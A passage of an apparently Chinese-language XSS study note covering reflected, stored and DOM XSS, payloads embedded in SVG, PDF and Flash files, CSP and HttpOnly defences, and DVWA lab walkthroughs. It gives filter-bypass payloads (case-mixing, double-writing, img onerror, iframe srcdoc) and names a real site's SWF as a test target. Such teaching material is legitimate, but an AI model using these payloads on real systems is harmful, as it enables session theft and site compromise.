class="hljs-comment">//echo $code;</span><br>**<span class="hljs-comment">//模拟成接受图片显示图片</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=<span class="hljs-subst">$code</span>&gt;&quot;</span>;**<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>可能会造成如下的：<strong>攻击语句存在导致格式问题不能被正常解析和执行</strong></p><p> <img src="/assets/image-20240804161431-4r6jtwf.png" alt="image">​</p><p> 查看源码</p><p> <img src="/assets/image-20240804161454-vi8kmkx.png" alt="image">​</p></li><li><p>解决方式：使用特定的语句进行替换，如<code>x onerror=&quot;alert(1)&quot;</code>​如果你将 <code>onerror=&quot;alert(1)&quot;</code>​ 嵌入到某个 HTML 元素中，那么当该元素加载失败时（例如图像加载失败、脚本加载失败等），JavaScript 中的 <code>alert(1)</code>​ 将会被执行，弹出一个带有 “1” 的警告框。</p><p> <img src="/assets/image-20240804161604-9fd6ek5.png" alt="image">​</p><p> <img src="/assets/image-20240804161619-zl13g5j.png" alt="image">​</p></li></ol></li></ul><p>‍</p><p>‍</p><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>持久化，代码是存储在<strong>服务器中</strong>的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。</p><p><img src="/assets/image-20240804160737-7gd5wxl.png" alt="image">​</p><h5 id="简单案例-1"><a href="#简单案例-1" class="headerlink" title="简单案例"></a>简单案例</h5><ul><li><p>打开之前创建的留言板功能，依据ip访问<a href="http://192.168.88.1:82/gbook.php">http://192.168.88.1:82/gbook.php</a></p></li><li><p>将xss攻击写入在用户名处==：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>​== 内容随便填写，然后提交</p></li><li><p><strong>发现每次访问页面的时候，都会弹出1的提示框，说明xss攻击成功</strong></p><p><img src="/assets/image-20240804161930-pjychor.png" alt="image">​</p><p><img src="/assets/image-20240804162151-70jv22t.png" alt="image">​</p></li></ul><p>‍</p><p>‍</p><p>‍</p><h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><p>不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS</p><p>通过修改原始的客户端代码，受害者浏览器的DOM环境改变，导致有效载荷的执行。<br>页面本身没有变化，<strong>但由于DOM环境被恶意修改，有客户端代码被包含进了页面并执行。</strong></p><p><img src="/assets/image-20240804160820-0f0ku4i.png" alt="image">​</p><ol><li><p><strong>寻找可操纵的DOM元素</strong>： 攻击者会寻找页面上的DOM元素，例如URL参数、cookie、用户输入等，这些DOM元素的值可能会被动态地嵌入到页面中。</p></li><li><p><strong>构造恶意载荷</strong>： 攻击者通过在寻找到的DOM元素中注入恶意代码，构造出一个特殊的输入值。这个输入值在后续被浏览器解释执行时，将导致恶意代码执行。</p></li><li><p><strong>修改DOM环境</strong>： 攻击者通过修改DOM元素的值，或者在页面中插入特殊的HTML或脚本标签，改变了原始的DOM环境。</p></li><li><p><strong>触发和执行</strong>： 当<strong>页面加载或用户与页面交互时，浏览器解析修改后的DOM环境，执行了包含恶意代码的DOM元素，导致攻击生效。</strong></p></li><li><p><strong>经常出现 dom xss 的关键语句</strong></p><ul><li><p><code>document.referer</code>​ 属性</p></li><li><p><code>window.name</code>​ 属性</p></li><li><p><code>location</code>​ 属性</p></li><li><p><code>innerHTML</code>​ 属性</p></li><li><p><code>documen.write</code>​ 属性</p></li></ul></li></ol><h5 id="简单案例-2"><a href="#简单案例-2" class="headerlink" title="简单案例"></a>简单案例</h5><ul><li><p>创建对应的html代码，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- </span><br><span class="hljs-comment">    dom-xss-test 页面</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    1. 设置页面标题为 &quot;dom-xss-test&quot;。</span><br><span class="hljs-comment">    2. 引入 jQuery 库，版本为 1.6.1。</span><br><span class="hljs-comment">    3. 利用 JavaScript 检查当前 URL 的哈希部分。</span><br><span class="hljs-comment">    4. 如果存在哈希部分，提取其中的 URL，并将页面重定向到该 URL。</span><br><span class="hljs-comment">--&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 设置页面标题 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>dom-xss-test<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 引入 jQuery 库 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://code.jquery.com/jquery-1.6.1.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-comment">// JavaScript 代码</span></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> hash = location.<span class="hljs-property">hash</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-comment">// 如果 URL 中有哈希部分</span></span><br><span class="language-javascript">        <span class="hljs-keyword">if</span>(hash)&#123;</span><br><span class="language-javascript">            <span class="hljs-comment">// 提取 URL</span></span><br><span class="language-javascript"><span class="hljs-comment">//hash.substring(1): 对 hash 字符串调用 substring(1) 方法。</span></span><br><span class="language-javascript"><span class="hljs-comment">//substring 方法用于提取字符串的一部分，参数为开始索引。</span></span><br><span class="language-javascript"><span class="hljs-comment">//在这里，从索引 1 开始提取，即去掉了 # 号。</span></span><br><span class="language-javascript">            <span class="hljs-keyword">var</span> url = hash.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-comment">// 重定向页面到提取的 URL</span></span><br><span class="language-javascript">            location.<span class="hljs-property">href</span> = url;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 页面主体内容 --&gt;</span><br>    dom xss test.<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>通过URL访问该页面<a href="http://192.168.137.1:84/domxss.html#%E5%B9%B6%E5%9C%A8%60#%60%E2%80%8B%E5%90%8E%E9%9D%A2%E8%B7%9F%E4%B8%8A%EF%BC%8C%E6%83%B3%E8%A6%81%E8%B7%B3%E8%BD%AC%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%8D%B3%E5%8F%AF%E6%88%90%E5%8A%9F%E8%B7%B3%E8%BD%AC">http://192.168.137.1:84/domxss.html#并在`#`​后面跟上，想要跳转的页面，访问即可成功跳转</a></p><p><img src="/assets/image-20240804162818-p2scaj1.png" alt="image">​</p></li></ul><p>‍</p><h2 id="结合文件上传"><a href="#结合文件上传" class="headerlink" title="结合文件上传"></a>结合文件上传</h2><h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p>SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg&#x2F;png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。</p><p><img src="/assets/image-20240804181952-l1vzyns.png" alt="image">​</p><p><img src="/assets/image-20240804182008-cbq2bmm.png" alt="image">​</p><p>创建SVG格式的图片，并在源代码中加入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>​ xss弹窗代码，每当访问打开此文件时候，自动弹出弹窗</p><p><img src="/assets/image-20240804182132-2xtxzzf.png" alt="image">​</p><p><img src="/assets/image-20240804182153-bh3zv3e.png" alt="image">​</p><p>也可将此文件上传至文件上传页面，然后访问上传后生成的url，每次点击都会触发</p><p>类似这种</p><p><img src="/assets/image-20240804182628-k1ez8j1.png" alt="image">​</p><p>‍</p><h3 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h3><p>这里使用迅捷PDF编辑器</p><ol><li><p>创建PDF，加入动作JS</p><ol><li><p>打开PDF编辑器，创建新文档</p><p> <img src="/assets/image-20240804183411-ufizanu.png" alt="image">​</p></li><li><p>从视图选项中开启页面缩略图</p><p> <img src="/assets/image-20240804183429-kat23xd.png" alt="image">​</p></li><li><p>点击第一个缩略图，右键选中属性</p><p> <img src="/assets/image-20240804183442-9e7nmh5.png" alt="image">​</p></li><li><p>在右侧页面属性中依次找到动作→开始动作→点击三个点</p><p> <img src="/assets/image-20240804183458-tqu1swy.png" alt="image">​</p></li><li><p>&#x3D;&#x3D;点击新增→运行JavaScript→&#x3D;&#x3D;​&#x3D;&#x3D;<strong>添加Xss弹窗语句</strong>&#x3D;&#x3D;​&#x3D;&#x3D;<strong>​<code>app.alert(1)</code>​</strong>&#x3D;&#x3D; ​</p><p> <img src="/assets/image-20240804183511-1c1cbkd.png" alt="image">​</p></li></ol></li><li><p>通过文件上传获取直链</p><p> <img src="/assets/image-20240804182628-k1ez8j1.png" alt="image">​</p></li><li><p>直链地址访问后被触发（这里用的是Edge，火狐不行）</p><p> <img src="/assets/image-20240804183657-jzocb5r.png" alt="image">​</p></li></ol><p>‍</p><h3 id="FLASH"><a href="#FLASH" class="headerlink" title="FLASH"></a>FLASH</h3><p>需要下载Flash中心以及FlashCS6</p><ol><li><p>制作swf-xss文件</p><ol><li><p>新建swf文件，可以使用软件提供的模板</p><p> <img src="/assets/image-20240804184552-449luxm.png" alt="image">​</p></li><li><p>F9进入代码区域，并植入代码</p> <figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-comment">//取m参数</span><br><span class="hljs-keyword">var</span> m=_root.m;<br><span class="hljs-comment">//调用html中Javascript中的m参数值</span><br>flash.<span class="hljs-keyword">external</span>.ExternalInterface.call(m);<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240804184617-z7ipfzj.png" alt="image">​</p><p> 这个时候Ctrl+Enter检查是否有报错</p><p> 报错内容</p><p> <img src="/assets/image-20240804184538-eumb1lg.png" alt="image">​</p></li><li><p>属性发布设置解析，并点击发布到桌面</p><p> 点击发布设置，<strong>将脚本设置为：</strong>​&#x3D;&#x3D;<strong>ActionScript 2.0</strong>&#x3D;&#x3D;​ <strong>（置入代码仅支持2.0，否则会报错）</strong></p><p> <img src="/assets/image-20240804184824-a5zk8ou.png" alt="image">​</p></li><li><p>将发布在桌面==（创建好的携带Xss攻击的swf文件），<strong>存放在部署好的网址源码下，并进行访问</strong>。使用触发Xss触发语句，成功弹窗<strong>弹出Xss攻击弹窗</strong></p><p> <img src="/assets/image-20240804184940-2kaqa35.png" alt="image">​</p><p> <img src="/assets/image-20240804184945-bjcjfyi.png" alt="image">​</p></li></ol></li><li><p>测试swf文件xss安全性</p><p> xss一是指执行恶意js，那么为什么说flash xss呢？</p><p> 是因为flash有可以调用js的函数，也就是可以和js通信，因此这些函数如果使用不当就会造成xss。常见的可触发xss的危险函数有：<strong>getURL，navigateToURL，</strong>​<strong>ExternalInterface.call</strong>（最常见） <strong>，htmlText，loadMovie</strong>等等</p><p> 这里使用ffdec反编译</p><p> <img src="/assets/image-20240804185329-he62fhf.png" alt="image">​</p><p> 测试网站<a href="https://www.acg-123.org/images/uploader.swf%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%B9%B6%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6">https://www.acg-123.org/images/uploader.swf，访问并下载文件</a></p><ol><li><p>利用JPEXS Free Flash Decompiler工具，反编译swf文件,并查找<strong>ExternalInterface.call</strong>函数</p><p> <img src="/assets/image-20240804190112-ncvo9sq.png" alt="image">​</p></li><li><p>查看源码发现<code>this.jsobject = this.loaderInfo.parameters[&quot;jsobject&quot;];</code>​，<strong>程序并未写死可以读取任意传递回来的jsobject</strong></p><p> <img src="/assets/image-20240804190129-xd4t2f4.png" alt="image">​</p></li><li><p>直接使用分析出的触发点，进行输入Xss攻击语句,这里在本地测试,也可以直接在网站上测试</p><p> <img src="/assets/image-20240804190509-vao1f2j.png" alt="image">​</p></li></ol></li></ol><p>‍</p><p>‍</p><h2 id="Cookie盗取"><a href="#Cookie盗取" class="headerlink" title="Cookie盗取"></a>Cookie盗取</h2><p>搭建xss平台,使用payload直接插入存在有xss漏洞的地方即可</p><p>xss平台搭建：<a href="https://github.com/epoch99/BlueLotus/_XSSReceiver-master">https://github.com/epoch99/BlueLotus\_XSSReceiver-master</a></p><p>‍</p><p>‍</p><p>‍</p><h2 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h2><p>部署可访问的钓鱼页面并修改</p><p>‍</p><p>‍</p><p>‍</p><h2 id="框架控制"><a href="#框架控制" class="headerlink" title="框架控制"></a>框架控制</h2><p>只需执行JS文件，即可实现对当前浏览器的控制，可配合各类手法利用<br>缺点：如果对方浏览器关闭，权限就会掉</p><p>‍</p><p>‍</p><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><blockquote><p>CSP (Content Security Policy 内容安全策略)  各种语言都存在，只不过设置不同<br>内容安全策略是一种可信白名单机制，来限制网站中是否可以包含某来源内容。<br>该制度明确告诉客户端，哪些外部资源可以加载和执行，<strong>等同于提供白名单(当外部资源不在白名单内，禁止网站访问外部资源)</strong> ，<br>它的实现和执行全部由浏览器完成，开发者只需提供配置。<br>禁止加载外域代码，防止复杂的攻击逻辑。<br>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。<br>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。<br>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。<br>合理使用上报可以及时发现XSS，利于尽快修复问题。</p></blockquote><p><img src="/assets/image-20240811172351-8whjx6h.png" alt="image">​</p><p><img src="/assets/image-20240811172320-p3mydcb.png" alt="image">​</p><p>启用csp策略之后</p><p><img src="/assets/image-20240811172730-otrnodt.png" alt="image">​</p><p><img src="/assets/image-20240811172812-zew9jbf.png" alt="image">​</p><p>并且xss平台也不会收到相关cookie信息</p><p>‍</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>存在绕过方式，但是大都比较鸡肋，因为条件比较苛刻</p><p>文章：<a href="https://xz.aliyun.com/t/12370">https://xz.aliyun.com/t/12370</a></p><p>‍</p><h2 id="Http-Only"><a href="#Http-Only" class="headerlink" title="Http-Only"></a>Http-Only</h2><blockquote><p>禁止页面的JavaScript访问带有HttpOnly属性的Cookie。<br><span data-type="text" style="color: var(--b3-font-color1);">PHP.INI</span>设置或代码引用</p><p>-session.cookie_httponly &#x3D;<span data-type="text" style="color: var(--b3-font-color1);">1</span></p><p>-<span data-type="text" style="color: var(--b3-font-color1);">ini_set</span>(“<span data-type="text" style="color: var(--b3-font-color3);">session.cookie_httponly</span>“, <span data-type="text" style="color: var(--b3-font-color1);">1</span>);</p><p>-<span data-type="text" style="color: var(--b3-font-color1);">setcookie</span>(<span data-type="text" style="color: var(--b3-font-color11);">‘’, ‘’</span>, <span data-type="text" style="color: var(--b3-font-color1);">time</span>() <span data-type="text" style="color: var(--b3-font-color1);">+ 3600</span>, ‘<span data-type="text" style="color: var(--b3-font-color4);">&#x2F;xss</span>‘, ‘’, <span data-type="text" style="color: var(--b3-font-color1);">false</span>, <span data-type="text" style="color: var(--b3-font-color1);">true</span>);</p></blockquote><p>开启HttpOnly时XSS窃取Cookie的加载情况</p><p><img src="/assets/image-20240811174619-fhkbfds.png" alt="image">​</p><p><img src="/assets/image-20240811174743-nartvt2.png" alt="image">​</p><p>无法获取到name的值</p><p><img src="/assets/image-20240811174917-pvuyzqa.png" alt="image">​</p><p>平台也没有</p><p><img src="/assets/image-20240811175749-7aqouzg.png" alt="image">​</p><p>开启http-only但是并没有进行设置（等于没开）</p><p><img src="/assets/image-20240811180013-6d3ynhl.png" alt="image">​</p><p>可以访问到</p><p><img src="/assets/image-20240811180038-v875ogf.png" alt="image">​</p><p><img src="/assets/image-20240811180116-b7jbbpr.png" alt="image">​</p><p>‍</p><h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><p>三种，都比较鸡肋</p><p><a href="https://blog.csdn.net/weixin_42478365/article/details/116597222">CVE-PHPINFO-Flash&#x2F;java</a></p><p>‍</p><h1 id="如何测试"><a href="#如何测试" class="headerlink" title="如何测试"></a>如何测试</h1><h2 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h2><p>常用攻击语句</p><p><a href="assets/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%89%8B%E5%86%8CWEB%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E-20240327132410-5mt5mil.pdf">渗透测试手册WEB安全漏洞.pdf</a> P<sub>138 –</sub> P<sub>143</sub></p><p>尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：</p><ul><li>URL的每一个参数</li><li>URL本身</li><li>表单</li><li>搜索框</li><li>常见业务场景</li></ul><p>重灾区：评论区、留言区、个人信息、订单信息等 针对型：站内信、网页即时通讯、私信、意见反馈 存在风险：搜索框、当前目录、图片属性等</p><h2 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h2><p>代码审计</p><p>‍</p><h1 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h1><p>xss常用绕过标签以及姿势总结:</p><p><a href="https://www.freebuf.com/articles/web/340080.html">https://www.freebuf.com/articles/web/340080.html</a></p><p><a href="https://xz.aliyun.com/t/4067?time__1311=n4+xni0QG=oCqAKYiKDsD7feyQ2DgCZ=xriAoD">https://xz.aliyun.com/t/4067?time__1311=n4%2Bxni0QG%3DoCqAKYiKDsD7feyQ2DgCZ%3DxriAoD</a></p><p>‍</p><p>‍</p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p><img src="/assets/image-20240811193700-7ykpa80.png" alt="image">​</p><p>‍</p><p>‍</p><h1 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h1><p>对输入(和 URL 参数)进行过滤，对输出进行编码。</p><p>也就是对提交的所有内容进行过滤，对 url 中的参数进行过滤，过滤掉会导致脚本执行的相关内容；</p><p>然后对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行</p><p>‍</p><h1 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h1><p>‍</p><ol><li><h2 id="DVWA靶场"><a href="#DVWA靶场" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p> js代码在web应用的参数当中：搜索框</p><p> 数据流量：浏览器—-&gt;后端—-&gt;浏览器</p><h4 id="Low级别"><a href="#Low级别" class="headerlink" title="Low级别"></a>Low级别</h4><p> 源码：</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p> 方法一：</p><p> 输入 <code>&lt;script&gt;alert(&#39;wuhu&#39;)&lt;/script&gt;</code>​ 的结果：</p><p> <img src="/assets/image-20240408185927-14dym80.png" alt="image">​</p><p> 方法二：</p><p> 通过URL直接传递：</p><p> <img src="/assets/image-20240408190222-gunllxl.png" alt="image">​</p><h4 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h4><p> 源码：</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p> 这里仅过滤了<code>&lt;script&gt;</code>​这个标签</p><p> 方法一：</p><p> 大小写绕过</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;sCript&gt;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&#x27;wuhu&#x27;</span>)&lt;/scRIpt&gt;<br>&lt;SCRIPT&gt;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&#x27;wuhu&#x27;</span>)&lt;/SCRIPT&gt;<br></code></pre></td></tr></table></figure><p> 方法二：</p><p> 双写绕过</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;scr&lt;script&gt;ipt&gt;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&#x27;wuhu&#x27;</span>)&lt;/script&gt;<br>&lt;s&lt;script&gt;cript&gt;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&#x27;wuhu&#x27;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p> 方法三：</p><p> 使用非<code>&lt;script&gt;</code>的<a href="https://blog.csdn.net/mikebarton/article/details/103183559?ops_request_misc=&request_id=&biz_id=102&utm_term=body%E6%A0%87%E7%AD%BE%E5%BA%94%E7%94%A8%E5%88%B0xss&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-103183559.142%5Ev100%5Epc_search_result_base9&spm=1018.2226.3001.4449">其他标签</a></p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;img src=<span class="hljs-number">1</span> onerror=<span class="hljs-string">&#x27;alert(&quot;wuhu&quot;)&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><h4 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h4><p> 源码：</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p> 用<code>preg_replace()</code>​函数进行正则过滤<code>&lt;script&gt;</code>​标签，使用了正则表达式直接把<code>&lt;*s*c*r*i*p*t</code>​给过滤了，<code>*</code>​ 代表一个或多个任意字符，<code>i</code>​ 代表不区分大小写。所以<code>&lt;script&gt;</code>​标签在这里就不能用了，但可以通过<code>img</code>​、<code>body</code>​等标签的事件或者<code>iframe</code>​等<a href="https://blog.csdn.net/mikebarton/article/details/103183559?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=body%E6%A0%87%E7%AD%BE%E5%BA%94%E7%94%A8%E5%88%B0xss&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-103183559.142%5Ev100%5Epc_search_result_base9&amp;spm=1018.2226.3001.4449">其他标签</a>的src注入恶意的js代码。</p><p> 这里输入<code>&lt;img src=1 onerror=&#39;alert(&quot;wuhu&quot;)&#39;&gt;</code>​</p><p> <img src="/assets/image-20240408195544-q2g30qf.png" alt="image">​</p><p> 这里输入<code>&lt;iframe srcdoc=&quot;&lt;img src=x onerror=alert(&#39;wuhu&#39;)&gt;&quot;&gt;&lt;/iframe&gt;</code>​</p><p> <img src="/assets/image-20240408202258-rrsc1vu.png" alt="image">​</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p> js代码不在某个参数中，而是被写进了数据库或文件可以永久保存数据的介质中，如留言板等。</p><p> 数据流量：浏览器—&gt;后端—&gt;数据库—&gt;后端—&gt;浏览器</p><h4 id="Low级别-1"><a href="#Low级别-1" class="headerlink" title="Low级别"></a>Low级别</h4><p> 源码：</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 